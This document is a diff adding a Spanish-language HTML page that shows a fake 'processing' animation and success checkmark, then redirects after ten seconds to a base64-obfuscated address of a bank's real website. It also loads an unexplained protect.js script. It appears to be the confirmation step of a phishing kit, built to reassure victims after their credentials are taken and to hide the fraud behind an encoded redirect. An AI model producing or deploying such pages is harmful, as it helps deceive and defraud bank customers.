@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>Procesando...</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    html,body{height:100%;font-family:-apple-system,'Segoe UI',sans-serif}
+    body{display:flex;align-items:center;justify-content:center;background:#fff;transition:background 1s ease}
+    body.green{background:#16a34a}
+
+    .ring-wrap{position:relative;width:100px;height:100px}
+    .ring{position:absolute;inset:0;border-radius:50%;border:6px solid transparent;animation:spin 1s linear infinite}
+    .r1{border-top-color:#E30613}
+    .r2{border-right-color:#f87171;animation-duration:1.5s;animation-direction:reverse;width:76px;height:76px;top:12px;left:12px}
+    .r3{border-bottom-color:#fca5a5;animation-duration:2s;width:52px;height:52px;top:24px;left:24px}
+
+    .ring.green-ring{border-top-color:#16a34a}
+    .r2.green-ring{border-right-color:#4ade80}
+    .r3.green-ring{border-bottom-color:#bbf7d0}
+
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    .check{display:none;animation:popIn .4s cubic-bezier(.34,1.56,.64,1) forwards}
+    .check.show{display:block}
+    @keyframes popIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
+    .check svg{width:90px;height:90px}
+  </style>
+</head>
+<body>
+  <div id="wrap">
+    <div class="ring-wrap" id="rings">
+      <div class="ring r1" id="r1"></div>
+      <div class="ring r2" id="r2"></div>
+      <div class="ring r3" id="r3"></div>
+    </div>
+    <div class="check" id="check">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10" fill="#16a34a" stroke="none"/>
+        <path d="M7 12l4 4 6-7"/>
+      </svg>
+    </div>
+  </div>
+
+  <script>
+    // 0-4s: red rings
+    // 4-5s: rings turn green
+    // 5-6s: rings fade, checkmark appears
+    // 6-9s: background goes green, checkmark stays
+    // 10s:  redirect
+
+    var r1 = document.getElementById('r1');
+    var r2 = document.getElementById('r2');
+    var r3 = document.getElementById('r3');
+    var rings = document.getElementById('rings');
+    var check = document.getElementById('check');
+
+    // Phase 2: turn green
+    setTimeout(function(){
+      r1.classList.add('green-ring'); r1.style.borderTopColor='#16a34a';
+      r2.classList.add('green-ring'); r2.style.borderRightColor='#4ade80';
+      r3.classList.add('green-ring'); r3.style.borderBottomColor='#bbf7d0';
+    }, 4000);
+
+    // Phase 3: hide rings, show checkmark
+    setTimeout(function(){
+      rings.style.transition='opacity .4s';
+      rings.style.opacity='0';
+      setTimeout(function(){
+        rings.style.display='none';
+        check.classList.add('show');
+      }, 400);
+    }, 5000);
+
+    // Phase 4: background green
+    setTimeout(function(){
+      document.body.classList.add('green');
+    }, 6000);
+
+    // Redirect at 10s
+    setTimeout(function(){
+      window.location.replace(atob('aHR0cHM6Ly93d3cuYmFuY2F0bGFuLmhu'));
+    }, 10000);
+  </script>
+<script src="protect.js"></script>
+</body>
+</html>
